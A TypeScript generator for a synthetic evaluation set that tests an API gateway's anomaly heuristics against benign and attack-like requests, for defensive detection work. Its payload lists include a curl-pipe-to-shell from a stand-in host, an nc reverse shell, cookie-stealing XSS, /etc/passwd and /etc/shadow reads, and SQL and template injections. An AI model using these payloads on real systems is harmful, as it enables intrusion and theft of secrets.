import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import type { AttackCategory } from '../anomaly/anomaly.config.js';
import type { FeatureEnvelope } from '../anomaly/envelope.js';
import { type HeuristicInput, scoreHeuristics } from '../anomaly/heuristics.js';
import { redactBody, redactQuery } from '../anomaly/redactor.js';

/**
 * Deterministic generator for the v1 evaluation set (docs/06 §8.1, docs/08 S5-05):
 * 80 benign + 120 malicious/suspicious rows (40 injection, 30 scraping/enumeration,
 * 25 credential stuffing, 25 scanner signatures). Each row = feature envelope + label + categories.
 *
 *   pnpm --filter @omnigate/gateway eval:generate     -> docs/eval/anomaly-eval.jsonl
 */

export type Label = 'benign' | 'malicious';

export interface EvalRow {
  id: string;
  label: Label;
  categories: AttackCategory[];
  /** Human note on what this row exercises. */
  note: string;
  envelope: FeatureEnvelope;
}

/** mulberry32: tiny seeded PRNG so the file is reproducible. */
function rng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const BROWSERS = [
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1',
];
const INTEGRATIONS = [
  'omnigate-sdk-node/1.4.2',
  'axios/1.7.7',
  'okhttp/4.12.0',
  'Go-http-client/2.0',
  'python-requests/2.32.3',
];
const SCANNERS = [
  'sqlmap/1.8.5#stable (https://sqlmap.org)',
  'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)',
  'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)',
  'gobuster/3.6',
  'masscan/1.3.2',
  'ffuf/2.1.0',
  'DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)',
  'Mozilla/5.0 zgrab/0.x',
  'Havij',
  'nmap NSE http-enum',
];

interface Synthetic {
  method: string;
  path: string;
  query: string;
  body: unknown;
  userAgent?: string;
  routeMethods?: string[];
  stats?: Partial<HeuristicInput['stats']>;
  principalStats?: FeatureEnvelope['principalStats10m'];
  route?: string;
  principal?: string;
}

const quietStats: HeuristicInput['stats'] = {
  burstCount10s: 1,
  policyMax: 100,
  distinctPaths60s: 3,
  authFailures60s: 0,
  routeBody: { n: 500, mean: 220, std: 90 },
};

function toRow(
  id: string,
  label: Label,
  categories: AttackCategory[],
  note: string,
  s: Synthetic,
): EvalRow {
  const bodyBuf =
    s.body === undefined
      ? Buffer.alloc(0)
      : Buffer.from(
          typeof s.body === 'string' ? s.body : JSON.stringify(s.body),
        );
  const contentType =
    s.body === undefined
      ? undefined
      : typeof s.body === 'string'
        ? 'text/plain'
        : 'application/json';
  const stats = { ...quietStats, ...s.stats };
  const heuristic = scoreHeuristics({
    method: s.method,
    path: s.path,
    query: s.query,
    bodyText: bodyBuf.length ? bodyBuf.toString('utf8') : null,
    bodyBytes: bodyBuf.length,
    userAgent: s.userAgent,
    routeMethods: s.routeMethods ?? ['*'],
    stats,
  });
  return {
    id,
    label,
    categories,
    note,
    envelope: {
      requestId: `eval-${id}`,
      route: s.route ?? 'orders',
      method: s.method,
      path: s.path,
      principal: s.principal ?? 'api_key:eval-key',
      clientCountry: null,
      userAgent: s.userAgent ?? null,
      querySample: redactQuery(s.query),
      bodySample: redactBody(bodyBuf, contentType),
      heuristics: {
        score: heuristic.score,
        signals: heuristic.signals,
        categories: heuristic.categories,
        matchedPatterns: heuristic.matchedPatterns,
      },
      principalStats10m: s.principalStats ?? {
        requests: 40 + Math.round(stats.burstCount10s * 3),
        errorRate: 0.02,
        distinctPaths: Math.max(3, stats.distinctPaths60s),
      },
    },
  };
}

export function generateDataset(seed = 20260907): EvalRow[] {
  const rand = rng(seed);
  const pick = <T>(arr: readonly T[]): T =>
    arr[Math.floor(rand() * arr.length)];
  const int = (lo: number, hi: number): number =>
    lo + Math.floor(rand() * (hi - lo + 1));
  const rows: EvalRow[] = [];
  let n = 0;
  const add = (
    label: Label,
    categories: AttackCategory[],
    note: string,
    s: Synthetic,
  ): void => {
    rows.push(toRow(String(++n).padStart(3, '0'), label, categories, note, s));
  };

  // ---------------------------------------------------------------- 80 benign
  const names = [
    'Widget',
    'Gadget',
    'Gizmo',
    'Sprocket',
    "O'Brien",
    'Zoë Müller',
    '山田太郎',
    'Émilie',
    'Nguyễn Văn A',
    'محمد',
  ];
  for (let i = 0; i < 30; i++) {
    add('benign', [], 'browsing / pagination', {
      method: 'GET',
      path: pick([
        '/v1/orders',
        '/v1/items',
        '/v1/items/42',
        '/v1/customers/me',
        '/v1/orders/2026-09/summary',
      ]),
      query: pick([
        '',
        '?page=2&size=20',
        '?sort=name&q=blue%20shoes',
        '?from=2026-09-01&to=2026-09-07',
        "?q=coeur%20d'alene",
        '?filter=status%3Dshipped',
      ]),
      body: undefined,
      userAgent: pick(BROWSERS),
      stats: { burstCount10s: int(0, 4), distinctPaths60s: int(1, 8) },
    });
  }
  for (let i = 0; i < 20; i++) {
    add('benign', [], 'ordinary write with unicode and apostrophes', {
      method: pick(['POST', 'PUT', 'PATCH']),
      path: pick(['/v1/orders', '/v1/items', '/v1/customers/7/address']),
      query: '',
      body: {
        name: pick(names),
        note: pick([
          'please select gift wrap',
          'deliver and call on arrival',
          'union square pickup',
          'ring twice; leave at door',
        ]),
        qty: int(1, 5),
        price: int(5, 500) + 0.99,
      },
      userAgent: pick(BROWSERS),
      stats: { burstCount10s: int(0, 3), distinctPaths60s: int(1, 6) },
    });
  }
  for (let i = 0; i < 10; i++) {
    const items = Array.from({ length: int(40, 120) }, (_, k) => ({
      sku: `SKU-${k}`,
      name: `${pick(names)} ${k}`,
      tags: ['a', 'b', 'c'],
    }));
    add('benign', [], 'long but legitimate JSON (bulk import)', {
      method: 'POST',
      path: '/v1/items/bulk',
      query: '',
      body: { items },
      userAgent: pick(INTEGRATIONS),
      stats: {
        burstCount10s: int(0, 2),
        distinctPaths60s: 2,
        routeBody: { n: 500, mean: 4000, std: 2500 },
      },
    });
  }
  for (let i = 0; i < 12; i++) {
    add(
      'benign',
      [],
      'high-volume trusted integration (bursty but single path)',
      {
        method: 'GET',
        path: '/v1/inventory/levels',
        query: `?warehouse=${int(1, 9)}`,
        body: undefined,
        userAgent: pick(INTEGRATIONS),
        principal: 'api_key:erp-sync',
        stats: {
          burstCount10s: int(30, 70),
          policyMax: 1000,
          distinctPaths60s: int(1, 3),
        },
        principalStats: {
          requests: int(2000, 5000),
          errorRate: 0.001,
          distinctPaths: 2,
        },
      },
    );
  }
  for (let i = 0; i < 8; i++) {
    add('benign', [], 'file/asset paths with dots and encoded spaces', {
      method: 'GET',
      path: pick([
        '/v1/files/report.v2.final.pdf',
        '/v1/assets/logo%20dark.svg',
        '/v1/docs/2026.09.07-notes.md',
        '/v1/exports/orders.2026-09.csv',
      ]),
      query: pick(['', '?download=1', '?v=3.1.4']),
      body: undefined,
      userAgent: pick(BROWSERS),
    });
  }

  // ---------------------------------------------------------------- 40 injection
  const sqli = [
    "' OR 1=1--",
    "1' OR '1'='1",
    "admin'--",
    '1; DROP TABLE users; --',
    '1 UNION SELECT username, password FROM users--',
    "1' AND SLEEP(5)--",
    "1') OR ('a'='a",
    "x' UNION ALL SELECT NULL,NULL,version()--",
  ];
  const xss = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '"><script>fetch("//evil/"+document.cookie)</script>',
  ];
  const trav = [
    '../../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fshadow',
    '....//....//windows/win.ini',
    '/proc/self/environ',
  ];
  const cmd = [
    '8.8.8.8; cat /etc/passwd',
    '127.0.0.1 && whoami',
    '$(curl evil.example/x.sh | sh)',
    '`id`',
    '| nc -e /bin/sh 10.0.0.1 4444',
  ];
  const ssti = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
  ];
  const encode = (p: string, mode: number): string =>
    mode === 0
      ? p
      : mode === 1
        ? encodeURIComponent(p)
        : encodeURIComponent(encodeURIComponent(p));
  const via = (payload: string, i: number): Synthetic => {
    const mode = i % 3; // raw / url-encoded / double-encoded
    switch (i % 4) {
      case 0:
        return {
          method: 'GET',
          path: '/v1/orders',
          query: `?id=${encode(payload, mode)}`,
          body: undefined,
          userAgent: pick(BROWSERS),
        };
      case 1:
        return {
          method: 'POST',
          path: '/v1/search',
          query: '',
          body: { q: payload },
          userAgent: pick(INTEGRATIONS),
        };
      case 2:
        return {
          method: 'GET',
          path: `/v1/files/${encode(payload, mode)}`,
          query: '',
          body: undefined,
          userAgent: pick(BROWSERS),
        };
      default:
        return {
          method: 'PUT',
          path: '/v1/profile',
          query: '',
          body: { displayName: payload, bio: 'hello' },
          userAgent: pick(BROWSERS),
        };
    }
  };
  let k = 0;
  for (const p of sqli)
    for (let r = 0; r < 2; r++)
      add('malicious', ['sqli'], 'sql injection', via(p, k++));
  for (const p of xss)
    for (let r = 0; r < 2; r++)
      add('malicious', ['xss'], 'cross-site scripting', via(p, k++));
  for (const p of trav)
    add('malicious', ['traversal'], 'path traversal', via(p, k++));
  for (const p of cmd)
    add('malicious', ['cmd_injection'], 'command injection', via(p, k++));
  for (const p of ssti)
    add('malicious', ['ssti'], 'template injection', via(p, k++));
  add('malicious', ['sqli'], 'sql injection, mixed case and comments', {
    method: 'GET',
    path: '/v1/orders',
    query: "?id=1'/**/oR/**/'1'='1",
    body: undefined,
    userAgent: pick(BROWSERS),
  });

  // ---------------------------------------------------------------- 30 scraping / enumeration
  for (let i = 0; i < 18; i++) {
    add(
      'malicious',
      ['scraping', 'enumeration'],
      'catalogue scraping: many distinct paths at high rate',
      {
        method: 'GET',
        path: `/v1/items/${int(1000, 99999)}`,
        query: '',
        body: undefined,
        userAgent: pick([...INTEGRATIONS.slice(3), pick(BROWSERS)]),
        principal: `anon:203.0.113.${int(2, 250)}`,
        stats: { burstCount10s: int(60, 140), distinctPaths60s: int(55, 400) },
        principalStats: {
          requests: int(3000, 12000),
          errorRate: 0.15,
          distinctPaths: int(500, 5000),
        },
      },
    );
  }
  for (let i = 0; i < 12; i++) {
    add('malicious', ['enumeration'], 'id enumeration probing 404s', {
      method: 'GET',
      path: `/v1/users/${int(1, 5000)}`,
      query: '',
      body: undefined,
      userAgent: pick(INTEGRATIONS),
      principal: `api_key:trial-${int(1, 9)}`,
      stats: { burstCount10s: int(20, 60), distinctPaths60s: int(50, 200) },
      principalStats: {
        requests: int(800, 3000),
        errorRate: 0.7,
        distinctPaths: int(300, 2000),
      },
    });
  }

  // ---------------------------------------------------------------- 25 credential stuffing
  for (let i = 0; i < 25; i++) {
    add(
      'malicious',
      ['credential_stuffing'],
      'credential stuffing against login',
      {
        method: 'POST',
        path: pick(['/v1/auth/login', '/v1/login', '/v1/token']),
        query: '',
        body: {
          email: `user${int(1, 99999)}@example.com`,
          password: `Password${int(1, 999)}!`,
        },
        userAgent: pick([
          ...BROWSERS,
          'python-requests/2.32.3',
          'okhttp/4.12.0',
        ]),
        principal: `anon:198.51.100.${int(2, 250)}`,
        stats: {
          burstCount10s: int(8, 40),
          distinctPaths60s: int(1, 3),
          authFailures60s: int(12, 120),
        },
        principalStats: {
          requests: int(200, 900),
          errorRate: 0.95,
          distinctPaths: 2,
        },
      },
    );
  }

  // ---------------------------------------------------------------- 25 scanner signatures
  const probes = [
    '/.env',
    '/wp-login.php',
    '/admin/',
    '/.git/config',
    '/phpmyadmin/',
    '/actuator/env',
    '/server-status',
    '/cgi-bin/test.cgi',
    '/api/v1/swagger.json',
    '/.aws/credentials',
    '/config.php.bak',
    '/xmlrpc.php',
  ];
  for (let i = 0; i < 25; i++) {
    add(
      'malicious',
      ['enumeration'],
      'known scanner user agent probing common paths',
      {
        method: pick(['GET', 'GET', 'HEAD', 'OPTIONS']),
        path: pick(probes),
        query: i % 5 === 0 ? "?id=1'" : '',
        body: undefined,
        userAgent: pick(SCANNERS),
        routeMethods: ['GET', 'POST'],
        principal: `anon:192.0.2.${int(2, 250)}`,
        stats: {
          burstCount10s: int(10, 90),
          distinctPaths60s: int(30, 300),
          authFailures60s: int(0, 5),
        },
        principalStats: {
          requests: int(300, 4000),
          errorRate: 0.6,
          distinctPaths: int(200, 3000),
        },
      },
    );
  }

  return rows;
}

export function summarize(
  rows: EvalRow[],
  threshold = 0.7,
): {
  precision: number;
  recall: number;
  f1: number;
  tp: number;
  fp: number;
  fn: number;
  tn: number;
} {
  let tp = 0,
    fp = 0,
    fn = 0,
    tn = 0;
  for (const r of rows) {
    const flagged = r.envelope.heuristics.score >= threshold;
    if (r.label === 'malicious') {
      if (flagged) tp++;
      else fn++;
    } else if (flagged) fp++;
    else tn++;
  }
  const precision = tp + fp ? tp / (tp + fp) : 0;
  const recall = tp + fn ? tp / (tp + fn) : 0;
  const f1 =
    precision + recall ? (2 * precision * recall) / (precision + recall) : 0;
  return { precision, recall, f1, tp, fp, fn, tn };
}

const isMain =
  process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href;
if (isMain) {
  const out = resolve(process.argv[2] ?? '../../docs/eval/anomaly-eval.jsonl');
  const rows = generateDataset();
  mkdirSync(dirname(out), { recursive: true });
  writeFileSync(out, rows.map((r) => JSON.stringify(r)).join('\n') + '\n');
  const benign = rows.filter((r) => r.label === 'benign').length;
  console.log(
    `wrote ${rows.length} rows (${benign} benign, ${rows.length - benign} malicious) to ${out}`,
  );
  const s = summarize(rows);
  console.log(
    `heuristics-only @0.7: precision ${s.precision.toFixed(3)} recall ${s.recall.toFixed(3)} f1 ${s.f1.toFixed(3)} (tp ${s.tp} fp ${s.fp} fn ${s.fn} tn ${s.tn})`,
  );
}
